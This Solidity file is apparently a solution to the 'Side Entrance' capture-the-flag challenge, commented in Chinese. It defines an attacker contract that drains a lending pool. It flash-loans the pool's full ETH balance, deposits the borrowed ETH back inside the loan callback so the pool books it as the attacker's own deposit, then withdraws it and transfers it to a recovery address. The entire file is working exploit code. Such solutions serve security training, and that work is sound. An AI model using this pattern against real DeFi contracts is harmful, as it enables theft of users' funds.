// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "./SideEntranceLenderPool.sol";

contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;
    address payable recovery;

    constructor(SideEntranceLenderPool _pool, address payable _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    function attack() external {
        // 借出pool中的所有ETH
        uint256 poolBalance = address(pool).balance;
        pool.flashLoan(poolBalance);

        // 提取存款
        pool.withdraw();

        // 将ETH转给recovery地址
        recovery.transfer(address(this).balance);
    }

    function execute() external payable override {
        // 将借来的ETH存回pool（变成我们的存款）
        pool.deposit{value: msg.value}();
    }

    // 允许合约接收ETH
    receive() external payable {}
}
